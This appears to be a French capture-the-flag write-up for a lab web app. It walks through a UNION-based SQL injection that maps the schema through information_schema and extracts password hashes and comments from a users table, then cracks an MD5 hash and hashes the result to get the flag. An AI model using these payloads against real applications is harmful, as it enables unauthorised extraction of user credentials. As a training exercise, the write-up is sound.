# SQL Injection - User Data Extraction

## Description
Cette vulnérabilité exploite une injection SQL pour extraire des données sensibles.

## Exploitation

### Étape 1: Découverte de la structure de la base de données
Nous utilisons une injection SQL pour récupérer toutes les tables et colonnes dans toutes les bases de données accessibles :

```sql
1 UNION SELECT table_name, column_name FROM information_schema.columns;
```

Cette requête nous permet de mapper complètement la structure de la base de données.

### Étape 2: Identification de la table cible
Parmi les résultats, nous identifions une table prometteuse : `users` qui contient plusieurs colonnes intéressantes :
- `user_id`
- `first_name`
- `last_name`
- `town`
- `country`
- `planet`
- `Commentaire`
- `countersign`

### Étape 3: Confirmation de la base de données courante
En analysant le comportement de la page dans laquelle nous sommes (là où nous faisons les injections SQL), on remarque que lors d'une recherche par ID, nous obtenons un `first_name` et un `last_name`. Cela suggère que nous sommes déjà dans la base de données contenant la table `users`.

### Étape 4: Extraction des données sensibles
Après plusieurs essais, nous trouvons que les colonnes `countersign` et `Commentaire` contiennent des données sensibles.

```sql
1 UNION SELECT countersign, commentaire FROM users;
```

### Résultats obtenus
Cette requête nous retourne le résultat suivant à la fin de la liste :

```text
ID: 1 union select countersign,commentaire from users;
First name: 5ff9d0165b4f92b14994e5c685cdce28
Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
```

### Étape 5: Analyse du résultat
Le résultat révèle :
- **Un message crypté** : `5ff9d0165b4f92b14994e5c685cdce28`
- **Des instructions** : "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"

### Étape 6: Déchiffrement et transformation
Suivant les instructions fournies :

1. **Déchiffrement MD5** :
   ```
   5ff9d0165b4f92b14994e5c685cdce28 → "FortyTwo"
   ```

2. **Conversion en minuscules** :
   ```
   "FortyTwo" → "fortytwo"
   ```

3. **Hachage SHA256** :
   ```bash
   echo -n "fortytwo" | sha256sum
   ```

On obtient le flag après hachage SHA256: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
